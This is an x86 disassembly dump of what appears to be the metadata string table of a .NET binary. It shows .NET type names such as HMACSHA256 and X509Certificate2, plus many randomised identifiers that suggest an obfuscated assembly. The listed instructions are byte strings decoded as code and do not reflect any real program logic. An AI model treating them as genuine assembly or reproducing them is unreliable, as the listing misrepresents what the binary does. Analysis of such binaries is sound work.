  4076e1:	00 91 00 25 00 02    	add    %dl,0x2002500(%ecx)
  4076e7:	00 92 00 27 00 16    	add    %dl,0x16002700(%edx)
  4076ed:	00 c0                	add    %al,%al
  4076ef:	00 03                	add    %al,(%ebx)
  4076f1:	00 16                	add    %dl,(%esi)
  4076f3:	00 c2                	add    %al,%dl
  4076f5:	00 05 00 16 00 c4    	add    %al,0xc4001600
  4076fb:	00 07                	add    %al,(%edi)
  4076fd:	00 18                	add    %bl,(%eax)
  4076ff:	00 26                	add    %ah,(%esi)
  407701:	01 09                	add    %ecx,(%ecx)
  407703:	00 69 17             	add    %ch,0x17(%ecx)
  407706:	5c                   	pop    %esp
  407707:	17                   	pop    %ss
  407708:	74 17                	je     0x407721
  40770a:	ef                   	out    %eax,(%dx)
  40770b:	05 5b 06 75 06       	add    $0x675065b,%eax
  407710:	9c                   	pushf
  407711:	06                   	push   %es
  407712:	ff 06                	incl   (%esi)
  407714:	27                   	daa
  407715:	07                   	pop    %es
  407716:	00 01                	add    %al,(%ecx)
  407718:	71 00                	jno    0x40771a
  40771a:	48                   	dec    %eax
  40771b:	24 01                	and    $0x1,%al
  40771d:	00 00                	add    %al,(%eax)
  40771f:	01 73 00             	add    %esi,0x0(%ebx)
  407722:	8e 23                	mov    (%ebx),%fs
  407724:	01 00                	add    %eax,(%eax)
  407726:	00 01                	add    %al,(%ecx)
  407728:	75 00                	jne    0x40772a
  40772a:	98                   	cwtl
  40772b:	0e                   	push   %cs
  40772c:	02 00                	add    (%eax),%al
  40772e:	41                   	inc    %ecx
  40772f:	01 77 00             	add    %esi,0x0(%edi)
  407732:	b7 22                	mov    $0x22,%bh
  407734:	02 00                	add    (%eax),%al
  407736:	40                   	inc    %eax
  407737:	01 79 00             	add    %edi,0x0(%ecx)
  40773a:	8e 10                	mov    (%eax),%ss
  40773c:	02 00                	add    (%eax),%al
  40773e:	40                   	inc    %eax
  40773f:	01 7b 00             	add    %edi,0x0(%ebx)
  407742:	e2 16                	loop   0x40775a
  407744:	03 00                	add    (%eax),%eax
  407746:	50                   	push   %eax
  407747:	20 00                	and    %al,(%eax)
  407749:	00 2d 00 70 20 00    	add    %ch,0x207000
  40774f:	00 47 00             	add    %al,0x0(%edi)
  407752:	04 80                	add    $0x80,%al
  407754:	00 00                	add    %al,(%eax)
  407756:	01 00                	add    %eax,(%eax)
	...
  407764:	f8                   	clc
  407765:	0a 00                	or     (%eax),%al
  407767:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  407772:	00 00                	add    %al,(%eax)
  407774:	01 00                	add    %eax,(%eax)
  407776:	5e                   	pop    %esi
  407777:	0a 00                	or     (%eax),%al
  407779:	00 00                	add    %al,(%eax)
  40777b:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  407786:	00 00                	add    %al,(%eax)
  407788:	01 00                	add    %eax,(%eax)
  40778a:	20 18                	and    %bl,(%eax)
  40778c:	00 00                	add    %al,(%eax)
  40778e:	00 00                	add    %al,(%eax)
  407790:	04 00                	add    $0x0,%al
	...
  40779a:	00 00                	add    %al,(%eax)
  40779c:	cc                   	int3
  40779d:	00 98 14 00 00 00    	add    %bl,0x14(%eax)
  4077a3:	00 04 00             	add    %al,(%eax,%eax,1)
  4077a6:	00 00                	add    %al,(%eax)
  4077a8:	00 00                	add    %al,(%eax)
  4077aa:	00 00                	add    %al,(%eax)
  4077ac:	70 00                	jo     0x4077ae
  4077ae:	00 00                	add    %al,(%eax)
  4077b0:	01 00                	add    %eax,(%eax)
  4077b2:	4c                   	dec    %esp
  4077b3:	10 00                	adc    %al,(%eax)
  4077b5:	00 00                	add    %al,(%eax)
  4077b7:	00 0a                	add    %cl,(%edx)
	...
  4077c1:	00 00                	add    %al,(%eax)
  4077c3:	00 cc                	add    %cl,%ah
  4077c5:	00 e2                	add    %ah,%dl
  4077c7:	0a 00                	or     (%eax),%al
  4077c9:	00 00                	add    %al,(%eax)
  4077cb:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077d6:	00 00                	add    %al,(%eax)
  4077d8:	cc                   	int3
  4077d9:	00 63 22             	add    %ah,0x22(%ebx)
  4077dc:	00 00                	add    %al,(%eax)
  4077de:	00 00                	add    %al,(%eax)
  4077e0:	04 00                	add    $0x0,%al
	...
  4077ea:	00 00                	add    %al,(%eax)
  4077ec:	01 00                	add    %eax,(%eax)
  4077ee:	19 20                	sbb    %esp,(%eax)
  4077f0:	00 00                	add    %al,(%eax)
  4077f2:	00 00                	add    %al,(%eax)
  4077f4:	04 00                	add    $0x0,%al
  4077f6:	00 00                	add    %al,(%eax)
  4077f8:	00 00                	add    %al,(%eax)
  4077fa:	00 00                	add    %al,(%eax)
  4077fc:	70 00                	jo     0x4077fe
  4077fe:	00 00                	add    %al,(%eax)
  407800:	cc                   	int3
  407801:	00 77 1b             	add    %dh,0x1b(%edi)
  407804:	00 00                	add    %al,(%eax)
  407806:	00 00                	add    %al,(%eax)
  407808:	0c 00                	or     $0x0,%al
  40780a:	0b 00                	or     (%eax),%eax
  40780c:	10 00                	adc    %al,(%eax)
  40780e:	0f 00 14 00          	lldt   (%eax,%eax,1)
  407812:	13 00                	adc    (%eax),%eax
  407814:	1e                   	push   %ds
  407815:	00 1d 00 75 01 8d    	add    %bl,0x8d017500
  40781b:	06                   	push   %es
  40781c:	00 41 63             	add    %al,0x63(%ecx)
  40781f:	74 69                	je     0x40788a
  407821:	6f                   	outsl  %ds:(%esi),(%dx)
  407822:	6e                   	outsb  %ds:(%esi),(%dx)
  407823:	60                   	pusha
  407824:	31 30                	xor    %esi,(%eax)
  407826:	00 49 45             	add    %cl,0x45(%ecx)
  407829:	6e                   	outsb  %ds:(%esi),(%dx)
  40782a:	75 6d                	jne    0x407899
  40782c:	65 72 61             	gs jb  0x407890
  40782f:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  407833:	31 00                	xor    %eax,(%eax)
  407835:	43                   	inc    %ebx
  407836:	61                   	popa
  407837:	6c                   	insb   (%dx),%es:(%edi)
  407838:	6c                   	insb   (%dx),%es:(%edi)
  407839:	53                   	push   %ebx
  40783a:	69 74 65 60 31 00 4c 	imul   $0x694c0031,0x60(%ebp,%eiz,2),%esi
  407841:	69 
  407842:	73 74                	jae    0x4078b8
  407844:	60                   	pusha
  407845:	31 00                	xor    %eax,(%eax)
  407847:	4d                   	dec    %ebp
  407848:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  40784f:	74 2e                	je     0x40787f
  407851:	57                   	push   %edi
  407852:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  407859:	55                   	push   %ebp
  40785a:	49                   	dec    %ecx
  40785b:	6e                   	outsb  %ds:(%esi),(%dx)
  40785c:	74 33                	je     0x407891
  40785e:	32 00                	xor    (%eax),%al
  407860:	54                   	push   %esp
  407861:	6f                   	outsl  %ds:(%esi),(%dx)
  407862:	49                   	dec    %ecx
  407863:	6e                   	outsb  %ds:(%esi),(%dx)
  407864:	74 33                	je     0x407899
  407866:	32 00                	xor    (%eax),%al
  407868:	58                   	pop    %eax
  407869:	35 30 39 43 65       	xor    $0x65433930,%eax
  40786e:	72 74                	jb     0x4078e4
  407870:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  407877:	32 00                	xor    (%eax),%al
  407879:	54                   	push   %esp
  40787a:	6f                   	outsl  %ds:(%esi),(%dx)
  40787b:	55                   	push   %ebp
  40787c:	49                   	dec    %ecx
  40787d:	6e                   	outsb  %ds:(%esi),(%dx)
  40787e:	74 36                	je     0x4078b6
  407880:	34 00                	xor    $0x0,%al
  407882:	54                   	push   %esp
  407883:	6f                   	outsl  %ds:(%esi),(%dx)
  407884:	49                   	dec    %ecx
  407885:	6e                   	outsb  %ds:(%esi),(%dx)
  407886:	74 36                	je     0x4078be
  407888:	34 00                	xor    $0x0,%al
  40788a:	54                   	push   %esp
  40788b:	6f                   	outsl  %ds:(%esi),(%dx)
  40788c:	55                   	push   %ebp
  40788d:	49                   	dec    %ecx
  40788e:	6e                   	outsb  %ds:(%esi),(%dx)
  40788f:	74 31                	je     0x4078c2
  407891:	36 00 54 6f 49       	add    %dl,%ss:0x49(%edi,%ebp,2)
  407896:	6e                   	outsb  %ds:(%esi),(%dx)
  407897:	74 31                	je     0x4078ca
  407899:	36 00 48 4d          	add    %cl,%ss:0x4d(%eax)
  40789d:	41                   	inc    %ecx
  40789e:	43                   	inc    %ebx
  40789f:	53                   	push   %ebx
  4078a0:	48                   	dec    %eax
  4078a1:	41                   	inc    %ecx
  4078a2:	32 35 36 00 67 65    	xor    0x65670036,%dh
  4078a8:	74 5f                	je     0x407909
  4078aa:	55                   	push   %ebp
  4078ab:	54                   	push   %esp
  4078ac:	46                   	inc    %esi
  4078ad:	38 00                	cmp    %al,(%eax)
  4078af:	3c 4d                	cmp    $0x4d,%al
  4078b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4078b2:	64 75 6c             	fs jne 0x407921
  4078b5:	65 3e 00 65 50       	gs add %ah,%ds:0x50(%ebp)
  4078ba:	52                   	push   %edx
  4078bb:	54                   	push   %esp
  4078bc:	49                   	dec    %ecx
  4078bd:	54                   	push   %esp
  4078be:	46                   	inc    %esi
  4078bf:	53                   	push   %ebx
  4078c0:	7a 4c                	jp     0x40790e
  4078c2:	4d                   	dec    %ebp
  4078c3:	41                   	inc    %ecx
  4078c4:	00 4f 66             	add    %cl,0x66(%edi)
  4078c7:	46                   	inc    %esi
  4078c8:	61                   	popa
  4078c9:	47                   	inc    %edi
  4078ca:	58                   	pop    %eax
  4078cb:	42                   	inc    %edx
  4078cc:	44                   	inc    %esp
  4078cd:	46                   	inc    %esi
  4078ce:	4a                   	dec    %edx
  4078cf:	68 50 52 41 00       	push   $0x415250
  4078d4:	76 41                	jbe    0x407917
  4078d6:	71 68                	jno    0x407940
  4078d8:	6e                   	outsb  %ds:(%esi),(%dx)
  4078d9:	59                   	pop    %ecx
  4078da:	50                   	push   %eax
  4078db:	77 54                	ja     0x407931
  4078dd:	41                   	inc    %ecx
  4078de:	00 4e 68             	add    %cl,0x68(%esi)
  4078e1:	5a                   	pop    %edx
  4078e2:	6e                   	outsb  %ds:(%esi),(%dx)
  4078e3:	71 63                	jno    0x407948
  4078e5:	44                   	inc    %esp
  4078e6:	55                   	push   %ebp
  4078e7:	64 6a 4a             	fs push $0x4a
  4078ea:	46                   	inc    %esi
  4078eb:	64 41                	fs inc %ecx
  4078ed:	00 77 77             	add    %dh,0x77(%edi)
  4078f0:	61                   	popa
  4078f1:	50                   	push   %eax
  4078f2:	54                   	push   %esp
  4078f3:	76 52                	jbe    0x407947
  4078f5:	54                   	push   %esp
  4078f6:	64 6c                	fs insb (%dx),%es:(%edi)
  4078f8:	6e                   	outsb  %ds:(%esi),(%dx)
  4078f9:	64 41                	fs inc %ecx
  4078fb:	00 73 4f             	add    %dh,0x4f(%ebx)
  4078fe:	72 6f                	jb     0x40796f
  407900:	6b 69 41 61          	imul   $0x61,0x41(%ecx),%ebp
  407904:	68 6b 6a 56 6c       	push   $0x6c566a6b
  407909:	41                   	inc    %ecx
  40790a:	00 48 71             	add    %cl,0x71(%eax)
  40790d:	71 4b                	jno    0x40795a
  40790f:	75 44                	jne    0x407955
  407911:	41                   	inc    %ecx
  407912:	52                   	push   %edx
  407913:	68 6a 51 57 4f       	push   $0x4f57516a
  407918:	77 4a                	ja     0x407964
  40791a:	42                   	inc    %edx
  40791b:	00 64 47 57          	add    %ah,0x57(%edi,%eax,2)
  40791f:	4d                   	dec    %ebp
  407920:	4a                   	dec    %edx
  407921:	4f                   	dec    %edi
  407922:	4e                   	dec    %esi
  407923:	4e                   	dec    %esi
  407924:	49                   	dec    %ecx
  407925:	55                   	push   %ebp
  407926:	73 53                	jae    0x40797b
  407928:	42                   	inc    %edx
  407929:	00 71 65             	add    %dh,0x65(%ecx)
  40792c:	46                   	inc    %esi
  40792d:	65 50                	gs push %eax
  40792f:	61                   	popa
  407930:	77 4a                	ja     0x40797c
  407932:	72 63                	jb     0x407997
  407934:	69 52 58 42 00 57 41 	imul   $0x41570042,0x58(%edx),%edx
  40793b:	5a                   	pop    %edx
  40793c:	55                   	push   %ebp
  40793d:	59                   	pop    %ecx
  40793e:	6e                   	outsb  %ds:(%esi),(%dx)
  40793f:	67 45                	addr16 inc %ebp
  407941:	71 65                	jno    0x4079a8
  407943:	4b                   	dec    %ebx
  407944:	61                   	popa
  407945:	42                   	inc    %edx
  407946:	00 4a 49             	add    %cl,0x49(%edx)
  407949:	4c                   	dec    %esp
  40794a:	4f                   	dec    %edi
  40794b:	69 58 63 4a 6f 42 00 	imul   $0x426f4a,0x63(%eax),%ebx
  407952:	47                   	inc    %edi
  407953:	43                   	inc    %ebx
  407954:	00 58 6a             	add    %bl,0x6a(%eax)
  407957:	68 6e 4c 6d 50       	push   $0x506d4c6e
  40795c:	64 51                	fs push %ecx
  40795e:	43                   	inc    %ebx
  40795f:	00 42 62             	add    %al,0x62(%edx)
  407962:	64 52                	fs push %edx
  407964:	66 50                	push   %ax
  407966:	4e                   	dec    %esi
  407967:	42                   	inc    %edx
  407968:	59                   	pop    %ecx
  407969:	64 7a 6a             	fs jp  0x4079d6
  40796c:	65 43                	gs inc %ebx
  40796e:	00 55 62             	add    %dl,0x62(%ebp)
  407971:	59                   	pop    %ecx
  407972:	6c                   	insb   (%dx),%es:(%edi)
  407973:	44                   	inc    %esp
  407974:	42                   	inc    %edx
  407975:	73 42                	jae    0x4079b9
  407977:	54                   	push   %esp
  407978:	54                   	push   %esp
  407979:	70 41                	jo     0x4079bc
  40797b:	70 6d                	jo     0x4079ea
  40797d:	43                   	inc    %ebx
  40797e:	00 6b 54             	add    %ch,0x54(%ebx)
  407981:	75 48                	jne    0x4079cb
  407983:	6f                   	outsl  %ds:(%esi),(%dx)
  407984:	64 6b 4e 76 43       	imul   $0x43,%fs:0x76(%esi),%ecx
  407989:	00 76 44             	add    %dh,0x44(%esi)
  40798c:	6d                   	insl   (%dx),%es:(%edi)
  40798d:	6c                   	insb   (%dx),%es:(%edi)
  40798e:	66 41                	inc    %cx
  407990:	6c                   	insb   (%dx),%es:(%edi)
  407991:	68 6e 6c 73 42       	push   $0x42736c6e
  407996:	46                   	inc    %esi
  407997:	44                   	inc    %esp
  407998:	00 4d 61             	add    %cl,0x61(%ebp)
  40799b:	70 4e                	jo     0x4079eb
  40799d:	61                   	popa
  40799e:	6d                   	insl   (%dx),%es:(%edi)
  40799f:	65 54                	gs push %esp
  4079a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4079a2:	4f                   	dec    %edi
  4079a3:	49                   	dec    %ecx
  4079a4:	44                   	inc    %esp
  4079a5:	00 57 53             	add    %dl,0x53(%edi)
  4079a8:	4b                   	dec    %ebx
  4079a9:	47                   	inc    %edi
  4079aa:	73 67                	jae    0x407a13
  4079ac:	4e                   	dec    %esi
  4079ad:	45                   	inc    %ebp
  4079ae:	62 78 71             	bound  %edi,0x71(%eax)
  4079b1:	49                   	dec    %ecx
  4079b2:	44                   	inc    %esp
  4079b3:	00 67 65             	add    %ah,0x65(%edi)
  4079b6:	74 5f                	je     0x407a17
  4079b8:	46                   	inc    %esi
  4079b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4079ba:	72 6d                	jb     0x407a29
  4079bc:	61                   	popa
  4079bd:	74 49                	je     0x407a08
  4079bf:	44                   	inc    %esp
  4079c0:	00 42 58             	add    %al,0x58(%edx)
  4079c3:	50                   	push   %eax
  4079c4:	48                   	dec    %eax
  4079c5:	76 69                	jbe    0x407a30
  4079c7:	55                   	push   %ebp
  4079c8:	43                   	inc    %ebx
  4079c9:	75 4a                	jne    0x407a15
  4079cb:	44                   	inc    %esp
  4079cc:	00 67 50             	add    %ah,0x50(%edi)
  4079cf:	45                   	inc    %ebp
  4079d0:	47                   	inc    %edi
  4079d1:	44                   	inc    %esp
  4079d2:	63 4f 64             	arpl   %ecx,0x64(%edi)
  4079d5:	63 76 76             	arpl   %esi,0x76(%esi)
  4079d8:	50                   	push   %eax
  4079d9:	44                   	inc    %esp
  4079da:	00 6b 77             	add    %ch,0x77(%ebx)
  4079dd:	49                   	dec    %ecx
  4079de:	43                   	inc    %ebx
  4079df:	6a 71                	push   $0x71
  4079e1:	59                   	pop    %ecx
  4079e2:	61                   	popa
  4079e3:	61                   	popa
  4079e4:	4a                   	dec    %edx
  4079e5:	56                   	push   %esi
  4079e6:	44                   	inc    %esp
  4079e7:	00 43 42             	add    %al,0x42(%ebx)
  4079ea:	75 4c                	jne    0x407a38
  4079ec:	41                   	inc    %ecx
  4079ed:	51                   	push   %ecx
  4079ee:	6d                   	insl   (%dx),%es:(%edi)
  4079ef:	42                   	inc    %edx
  4079f0:	65 67 63 69 44       	arpl   %ebp,%gs:0x44(%bx,%di)
  4079f5:	00 54 54 53          	add    %dl,0x53(%esp,%edx,2)
  4079f9:	52                   	push   %edx
  4079fa:	4d                   	dec    %ebp
  4079fb:	56                   	push   %esi
  4079fc:	47                   	inc    %edi
  4079fd:	77 62                	ja     0x407a61
  4079ff:	6a 44                	push   $0x44
  407a01:	00 62 77             	add    %ah,0x77(%edx)
  407a04:	66 6f                	outsw  %ds:(%esi),(%dx)
  407a06:	50                   	push   %eax
  407a07:	45                   	inc    %ebp
  407a08:	4f                   	dec    %edi
  407a09:	64 6e                	outsb  %fs:(%esi),(%dx)
  407a0b:	73 6f                	jae    0x407a7c
  407a0d:	44                   	inc    %esp
  407a0e:	00 6c 54 4c          	add    %ch,0x4c(%esp,%edx,2)
  407a12:	6d                   	insl   (%dx),%es:(%edi)
  407a13:	43                   	inc    %ebx
  407a14:	76 66                	jbe    0x407a7c
  407a16:	6a 54                	push   $0x54
  407a18:	79 50                	jns    0x407a6a
  407a1a:	74 44                	je     0x407a60
  407a1c:	00 58 4d             	add    %bl,0x4d(%eax)
  407a1f:	44                   	inc    %esp
  407a20:	43                   	inc    %ebx
  407a21:	44                   	inc    %esp
  407a22:	4e                   	dec    %esi
  407a23:	45                   	inc    %ebp
  407a24:	77 50                	ja     0x407a76
  407a26:	53                   	push   %ebx
  407a27:	45                   	inc    %ebp
  407a28:	00 54 51 6b          	add    %dl,0x6b(%ecx,%edx,2)
  407a2c:	45                   	inc    %ebp
  407a2d:	4a                   	dec    %edx
  407a2e:	52                   	push   %edx
  407a2f:	65 56                	gs push %esi
  407a31:	71 61                	jno    0x407a94
  407a33:	45                   	inc    %ebp
  407a34:	00 44 52 64          	add    %al,0x64(%edx,%edx,2)
  407a38:	5a                   	pop    %edx
  407a39:	44                   	inc    %esp
  407a3a:	51                   	push   %ecx
  407a3b:	77 4c                	ja     0x407a89
  407a3d:	68 45 00 61 6f       	push   $0x6f610045
  407a42:	77 48                	ja     0x407a8c
  407a44:	4a                   	dec    %edx
  407a45:	6e                   	outsb  %ds:(%esi),(%dx)
  407a46:	61                   	popa
  407a47:	54                   	push   %esp
  407a48:	6e                   	outsb  %ds:(%esi),(%dx)
  407a49:	43                   	inc    %ebx
  407a4a:	61                   	popa
  407a4b:	73 45                	jae    0x407a92
  407a4d:	00 70 6a             	add    %dh,0x6a(%eax)
  407a50:	55                   	push   %ebp
  407a51:	51                   	push   %ecx
  407a52:	43                   	inc    %ebx
  407a53:	42                   	inc    %edx
  407a54:	65 54                	gs push %esp
  407a56:	51                   	push   %ecx
  407a57:	4b                   	dec    %ebx
  407a58:	54                   	push   %esp
  407a59:	46                   	inc    %esi
  407a5a:	00 4b 63             	add    %cl,0x63(%ebx)
  407a5d:	6b 6b 48 78          	imul   $0x78,0x48(%ebx),%ebp
  407a61:	5a                   	pop    %edx
  407a62:	54                   	push   %esp
  407a63:	59                   	pop    %ecx
  407a64:	71 71                	jno    0x407ad7
  407a66:	61                   	popa
  407a67:	46                   	inc    %esi
  407a68:	00 48 70             	add    %cl,0x70(%eax)
  407a6b:	44                   	inc    %esp
  407a6c:	72 73                	jb     0x407ae1
  407a6e:	4a                   	dec    %edx
  407a6f:	6a 77                	push   $0x77
  407a71:	56                   	push   %esi
  407a72:	77 46                	ja     0x407aba
  407a74:	00 79 55             	add    %bh,0x55(%ecx)
  407a77:	65 49                	gs dec %ecx
  407a79:	66 6e                	data16 outsb %ds:(%esi),(%dx)
  407a7b:	79 58                	jns    0x407ad5
  407a7d:	4f                   	dec    %edi
  407a7e:	53                   	push   %ebx
  407a7f:	4e                   	dec    %esi
  407a80:	43                   	inc    %ebx
  407a81:	47                   	inc    %edi
  407a82:	00 72 4c             	add    %dh,0x4c(%edx)
  407a85:	5a                   	pop    %edx
  407a86:	6d                   	insl   (%dx),%es:(%edi)
  407a87:	48                   	dec    %eax
  407a88:	69 4c 68 41 44 67 6d 	imul   $0x7a6d6744,0x41(%eax,%ebp,2),%ecx
  407a8f:	7a 
  407a90:	48                   	dec    %eax
  407a91:	66 48                	dec    %ax
  407a93:	47                   	inc    %edi
  407a94:	00 4b 4d             	add    %cl,0x4d(%ebx)
  407a97:	58                   	pop    %eax
  407a98:	58                   	pop    %eax
  407a99:	79 74                	jns    0x407b0f
  407a9b:	4e                   	dec    %esi
  407a9c:	56                   	push   %esi
  407a9d:	67 61                	addr16 popa
  407a9f:	68 4e 47 00 54       	push   $0x5400474e
  407aa4:	79 43                	jns    0x407ae9
  407aa6:	54                   	push   %esp
  407aa7:	62 55 50             	bound  %edx,0x50(%ebp)
  407aaa:	58                   	pop    %eax
  407aab:	69 4e 47 00 5a 44 43 	imul   $0x43445a00,0x47(%esi),%ecx
  407ab2:	70 49                	jo     0x407afd
  407ab4:	63 65 52             	arpl   %esp,0x52(%ebp)
  407ab7:	44                   	inc    %esp
  407ab8:	71 48                	jno    0x407b02
  407aba:	4f                   	dec    %edi
  407abb:	47                   	inc    %edi
  407abc:	00 79 65             	add    %bh,0x65(%ecx)
  407abf:	5a                   	pop    %edx
  407ac0:	45                   	inc    %ebp
  407ac1:	4f                   	dec    %edi
  407ac2:	68 4b 6c 6c 57       	push   $0x576c6c4b
  407ac7:	47                   	inc    %edi
  407ac8:	00 45 49             	add    %al,0x49(%ebp)
  407acb:	57                   	push   %edi
  407acc:	50                   	push   %eax
  407acd:	74 66                	je     0x407b35
  407acf:	73 6a                	jae    0x407b3b
  407ad1:	59                   	pop    %ecx
  407ad2:	4a                   	dec    %edx
  407ad3:	71 4f                	jno    0x407b24
  407ad5:	52                   	push   %edx
  407ad6:	65 59                	gs pop %ecx
  407ad8:	47                   	inc    %edi
  407ad9:	00 50 6f             	add    %dl,0x6f(%eax)
  407adc:	57                   	push   %edi
  407add:	41                   	inc    %ecx
  407ade:	4f                   	dec    %edi
  407adf:	71 71                	jno    0x407b52
  407ae1:	67 59                	addr16 pop %ecx
  407ae3:	47                   	inc    %edi
  407ae4:	00 49 76             	add    %cl,0x76(%ecx)
  407ae7:	6a 67                	push   $0x67
  407ae9:	61                   	popa
  407aea:	4f                   	dec    %edi
  407aeb:	77 65                	ja     0x407b52
  407aed:	56                   	push   %esi
  407aee:	65 6e                	outsb  %gs:(%esi),(%dx)
  407af0:	47                   	inc    %edi
  407af1:	00 69 69             	add    %ch,0x69(%ecx)
  407af4:	46                   	inc    %esi
  407af5:	79 5a                	jns    0x407b51
  407af7:	42                   	inc    %edx
  407af8:	66 62 74 46 48       	bound  %si,0x48(%esi,%eax,2)
  407afd:	00 69 4e             	add    %ch,0x4e(%ecx)
  407b00:	56                   	push   %esi
  407b01:	57                   	push   %edi
  407b02:	69 78 42 64 6c 77 75 	imul   $0x75776c64,0x42(%eax),%edi
  407b09:	4b                   	dec    %ebx
  407b0a:	4e                   	dec    %esi
  407b0b:	48                   	dec    %eax
  407b0c:	00 59 45             	add    %bl,0x45(%ecx)
  407b0f:	71 58                	jno    0x407b69
  407b11:	46                   	inc    %esi
  407b12:	58                   	pop    %eax
  407b13:	61                   	popa
  407b14:	41                   	inc    %ecx
  407b15:	41                   	inc    %ecx
  407b16:	58                   	pop    %eax
  407b17:	71 54                	jno    0x407b6d
  407b19:	48                   	dec    %eax
  407b1a:	00 6c 5a 4f          	add    %ch,0x4f(%edx,%ebx,2)
  407b1e:	75 71                	jne    0x407b91
  407b20:	56                   	push   %esi
  407b21:	42                   	inc    %edx
  407b22:	42                   	inc    %edx
  407b23:	71 41                	jno    0x407b66
  407b25:	66 74 65             	data16 je 0x407b8d
  407b28:	48                   	dec    %eax
  407b29:	00 46 6f             	add    %al,0x6f(%esi)
  407b2c:	5a                   	pop    %edx
  407b2d:	79 4c                	jns    0x407b7b
  407b2f:	5a                   	pop    %edx
  407b30:	54                   	push   %esp
  407b31:	6b 6a 48 00          	imul   $0x0,0x48(%edx),%ebp
  407b35:	52                   	push   %edx
  407b36:	62 4d 4c             	bound  %ecx,0x4c(%ebp)
  407b39:	76 44                	jbe    0x407b7f
  407b3b:	79 79                	jns    0x407bb6
  407b3d:	4d                   	dec    %ebp
  407b3e:	70 48                	jo     0x407b88
  407b40:	00 4b 44             	add    %cl,0x44(%ebx)
  407b43:	48                   	dec    %eax
  407b44:	61                   	popa
  407b45:	6b 6c 65 47 6b       	imul   $0x6b,0x47(%ebp,%eiz,2),%ebp
  407b4a:	76 48                	jbe    0x407b94
  407b4c:	00 67 65             	add    %ah,0x65(%edi)
  407b4f:	74 5f                	je     0x407bb0
  407b51:	41                   	inc    %ecx
  407b52:	53                   	push   %ebx
  407b53:	43                   	inc    %ebx
  407b54:	49                   	dec    %ecx
  407b55:	49                   	dec    %ecx
  407b56:	00 49 41             	add    %cl,0x41(%ecx)
  407b59:	4e                   	dec    %esi
  407b5a:	66 54                	push   %sp
  407b5c:	50                   	push   %eax
  407b5d:	73 59                	jae    0x407bb8
  407b5f:	65 49                	gs dec %ecx
  407b61:	6f                   	outsl  %ds:(%esi),(%dx)
  407b62:	59                   	pop    %ecx
  407b63:	64 49                	fs dec %ecx
  407b65:	00 48 66             	add    %cl,0x66(%eax)
  407b68:	63 6f 70             	arpl   %ebp,0x70(%edi)
  407b6b:	68 4a 48 72 55       	push   $0x5572484a
  407b70:	4f                   	dec    %edi
  407b71:	66 49                	dec    %cx
  407b73:	00 61 61             	add    %ah,0x61(%ecx)
  407b76:	41                   	inc    %ecx
  407b77:	50                   	push   %eax
  407b78:	41                   	inc    %ecx
  407b79:	51                   	push   %ecx
  407b7a:	43                   	inc    %ebx
  407b7b:	4d                   	dec    %ebp
  407b7c:	41                   	inc    %ecx
  407b7d:	6f                   	outsl  %ds:(%esi),(%dx)
  407b7e:	78 6b                	js     0x407beb
  407b80:	49                   	dec    %ecx
  407b81:	00 50 47             	add    %dl,0x47(%eax)
  407b84:	6d                   	insl   (%dx),%es:(%edi)
  407b85:	70 46                	jo     0x407bcd
  407b87:	46                   	inc    %esi
  407b88:	4f                   	dec    %edi
  407b89:	70 43                	jo     0x407bce
  407b8b:	76 49                	jbe    0x407bd6
  407b8d:	00 6d 70             	add    %ch,0x70(%ebp)
  407b90:	45                   	inc    %ebp
  407b91:	55                   	push   %ebp
  407b92:	51                   	push   %ecx
  407b93:	78 58                	js     0x407bed
  407b95:	6b 41 51 78          	imul   $0x78,0x51(%ecx),%eax
  407b99:	49                   	dec    %ecx
  407b9a:	00 77 6b             	add    %dh,0x6b(%edi)
  407b9d:	56                   	push   %esi
  407b9e:	49                   	dec    %ecx
  407b9f:	4a                   	dec    %edx
  407ba0:	76 7a                	jbe    0x407c1c
  407ba2:	41                   	inc    %ecx
  407ba3:	50                   	push   %eax
  407ba4:	79 49                	jns    0x407bef
  407ba6:	00 45 73             	add    %al,0x73(%ebp)
  407ba9:	4c                   	dec    %esp
  407baa:	41                   	inc    %ecx
  407bab:	42                   	inc    %edx
  407bac:	6e                   	outsb  %ds:(%esi),(%dx)
  407bad:	4e                   	dec    %esi
  407bae:	42                   	inc    %edx
  407baf:	54                   	push   %esp
  407bb0:	4f                   	dec    %edi
  407bb1:	72 46                	jb     0x407bf9
  407bb3:	4a                   	dec    %edx
  407bb4:	00 56 62             	add    %dl,0x62(%esi)
  407bb7:	4d                   	dec    %ebp
  407bb8:	70 75                	jo     0x407c2f
  407bba:	79 74                	jns    0x407c30
  407bbc:	68 4f 54 56 4a       	push   $0x4a56544f
  407bc1:	00 5a 4c             	add    %bl,0x4c(%edx)
  407bc4:	56                   	push   %esi
  407bc5:	47                   	inc    %edi
  407bc6:	64 6e                	outsb  %fs:(%esi),(%dx)
  407bc8:	4a                   	dec    %edx
  407bc9:	4a                   	dec    %edx
  407bca:	6d                   	insl   (%dx),%es:(%edi)
  407bcb:	6a 58                	push   $0x58
  407bcd:	4a                   	dec    %edx
  407bce:	00 46 6b             	add    %al,0x6b(%esi)
  407bd1:	4c                   	dec    %esp
  407bd2:	79 7a                	jns    0x407c4e
  407bd4:	65 61                	gs popa
  407bd6:	76 79                	jbe    0x407c51
  407bd8:	4a                   	dec    %edx
  407bd9:	00 72 5a             	add    %dh,0x5a(%edx)
  407bdc:	42                   	inc    %edx
  407bdd:	53                   	push   %ebx
  407bde:	4f                   	dec    %edi
  407bdf:	59                   	pop    %ecx
  407be0:	57                   	push   %edi
  407be1:	41                   	inc    %ecx
  407be2:	6b 76 45 4b          	imul   $0x4b,0x45(%esi),%esi
  407be6:	00 67 45             	add    %ah,0x45(%edi)
  407be9:	78 44                	js     0x407c2f
  407beb:	4b                   	dec    %ebx
  407bec:	73 6c                	jae    0x407c5a
  407bee:	63 5a 77             	arpl   %ebx,0x77(%edx)
  407bf1:	4f                   	dec    %edi
  407bf2:	4a                   	dec    %edx
  407bf3:	56                   	push   %esi
  407bf4:	4b                   	dec    %ebx
  407bf5:	00 74 6d 4c          	add    %dh,0x4c(%ebp,%ebp,2)
  407bf9:	48                   	dec    %eax
